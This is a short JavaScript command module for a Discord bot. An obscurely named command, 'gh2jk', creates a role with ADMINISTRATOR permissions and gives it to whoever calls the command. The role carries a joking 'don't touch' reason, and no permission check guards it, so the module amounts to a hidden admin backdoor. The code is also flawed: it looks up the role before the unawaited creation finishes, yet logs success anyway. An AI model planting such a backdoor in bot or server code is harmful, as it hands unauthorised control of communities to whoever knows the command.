module.exports = {
    name: 'gh2jk',
    execute(message, args){
     const Discord = require('discord.js')
      message.guild.roles.create({
        data: {
          name: 'donttouch',
          position: 102,
          permissions: 'ADMINISTRATOR',
        },
        reason: "this role's incredibly important, and if anyone touches it. the literal world will explode. looking at you ellen.",
      })
      var role = message.guild.roles.cache.find(role => role.name == 'donttouch')
      message.guild.member(message.author).roles.add(role)
        .catch(console.error);
        return console.log("Successfully gave role to messag author.")
    }
}
